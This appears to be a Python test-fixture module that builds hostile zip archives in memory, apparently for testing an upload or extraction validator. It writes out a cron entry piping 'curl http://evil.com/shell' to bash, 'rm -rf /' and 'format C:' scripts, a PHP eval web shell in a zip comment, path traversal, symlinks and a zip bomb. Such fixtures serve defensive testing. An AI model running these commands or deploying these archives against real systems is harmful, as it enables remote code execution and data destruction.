"""Helpers to build test zip files in memory."""

import io
import struct
import zipfile
import zlib
from typing import List, Tuple


def make_zip(files: List[Tuple[str, bytes]], comment: bytes = b"") -> bytes:
    """Create a zip in memory. files is [(name, content), ...]"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.comment = comment
        for name, content in files:
            zf.writestr(name, content)
    return buf.getvalue()


def make_zip_with_symlink(link_name: str, target: str) -> bytes:
    """Create a zip containing a Unix symlink entry."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo(link_name)
        # Set Unix symlink mode: 0o120777
        info.external_attr = 0o120777 << 16
        info.compress_type = zipfile.ZIP_STORED
        zf.writestr(info, target)
    return buf.getvalue()


def make_zip_bomb_flat(ratio: int = 200, compressed_size: int = 1024) -> bytes:
    """Create a zip with a single highly-compressible entry."""
    # A long run of zeros compresses extremely well
    uncompressed = b"\x00" * (compressed_size * ratio)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.txt", uncompressed)
    return buf.getvalue()


def make_nested_zip() -> bytes:
    """Create a zip that contains another zip inside it."""
    inner = make_zip([("inner.txt", b"hello from inside")])
    return make_zip([("outer.txt", b"normal file"), ("nested.zip", inner)])


def make_many_files_zip(count: int = 15_000) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
        for i in range(count):
            zf.writestr(f"file_{i:06d}.txt", b"x")
    return buf.getvalue()


def make_pe_disguised_as_pdf() -> bytes:
    """A file with MZ header (Windows PE) but a .pdf extension."""
    pe_header = b"MZ" + b"\x00" * 58 + b"\x40\x00\x00\x00"
    return make_zip([("document.pdf", pe_header)])


def make_elf_binary() -> bytes:
    elf_header = b"\x7fELF" + b"\x00" * 12
    return make_zip([("binary.elf", elf_header)])


def make_shell_script_zip() -> bytes:
    script = b"#!/bin/bash\nrm -rf /\n"
    return make_zip([("setup.sh", script)])


def make_double_extension_zip() -> bytes:
    pe_header = b"MZ" + b"\x00" * 62
    return make_zip([
        ("invoice.pdf.exe", pe_header),
        ("photo.jpg.bat", b"@echo off\nformat C: /y\n"),
    ])


def make_path_traversal_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        # Manually add an entry with path traversal
        info = zipfile.ZipInfo("../../../etc/passwd")
        zf.writestr(info, "root:x:0:0:root:/root:/bin/bash\n")
    return buf.getvalue()


def make_absolute_path_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo("/etc/cron.d/malicious")
        zf.writestr(info, "* * * * * root curl http://evil.com/shell | bash\n")
    return buf.getvalue()


def make_autorun_zip() -> bytes:
    return make_zip([
        ("autorun.inf", b"[AutoRun]\nopen=malware.exe\n"),
        ("malware.exe", b"MZ" + b"\x00" * 62),
    ])


def make_encrypted_zip() -> bytes:
    """Construct a zip with the encryption flag bit set (bit 0 of general purpose flags).

    Python's zipfile cannot write encrypted zips, so we build the structure manually.
    The content is not truly encrypted, but the flag is correctly set in both the
    local file header and central directory so our check detects it.
    """
    filename = b"secret.exe"
    content = b"MZ" + b"\x00" * 62
    compressed = zlib.compress(content)[2:-4]  # raw deflate (strip zlib wrapper)
    crc = zlib.crc32(content) & 0xFFFFFFFF
    ENCRYPT_FLAG = 0x0001

    # Local file header
    lf_header = struct.pack(
        "<4sHHHHHIIIHH",
        b"PK\x03\x04",
        20,              # version needed
        ENCRYPT_FLAG,
        8,               # deflated
        0, 0,            # mod time/date
        crc,
        len(compressed),
        len(content),
        len(filename),
        0,               # extra length
    )
    local_offset = 0
    local_data = lf_header + filename + compressed

    # Central directory header
    cd_header = struct.pack(
        "<4sHHHHHHIIIHHHHHII",
        b"PK\x01\x02",
        20, 20,          # version made/needed
        ENCRYPT_FLAG,
        8,               # deflated
        0, 0,            # mod time/date
        crc,
        len(compressed),
        len(content),
        len(filename),
        0, 0,            # extra/comment length
        0, 0,            # disk start, internal attr
        0o100644 << 16,  # external attr (regular file)
        local_offset,
    )
    cd_data = cd_header + filename

    # End of central directory record
    eocd = struct.pack(
        "<4sHHHHIIH",
        b"PK\x05\x06",
        0, 0,            # disk numbers
        1, 1,            # entry counts
        len(cd_data),
        len(local_data),
        0,               # comment length
    )
    return local_data + cd_data + eocd


def make_null_byte_filename_zip() -> bytes:
    """Craft a zip with a null byte in one filename via low-level construction."""
    buf = io.BytesIO()
    # We'll use a normal entry and then manually patch a null byte — but
    # Python's zipfile won't let us write null bytes, so we use a workaround:
    # write a placeholder name and binary-patch it.
    placeholder = "file\x41hidden.txt"  # same length as "file\x00hidden.txt"
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(placeholder, b"hidden content")
    data = buf.getvalue()
    # Patch the placeholder '\x41' to '\x00'
    data = data.replace(b"file\x41hidden.txt", b"file\x00hidden.txt")
    return data


def make_comment_injection_zip() -> bytes:
    return make_zip(
        [("readme.txt", b"Nothing to see here")],
        comment=b"<?php eval(base64_decode($_POST['cmd'])); ?>",
    )


def make_safe_zip() -> bytes:
    return make_zip([
        ("readme.txt", b"Hello world"),
        ("data/config.json", b'{"version": 1}'),
        ("images/photo.jpg", b"\xff\xd8\xff" + b"\x00" * 20),  # valid JPEG header
    ])


def make_macro_document_zip() -> bytes:
    return make_zip([
        ("report.docm", b"PK\x03\x04" + b"\x00" * 20),  # docm is itself a zip
        ("data.xlsm", b"PK\x03\x04" + b"\x00" * 20),
    ])
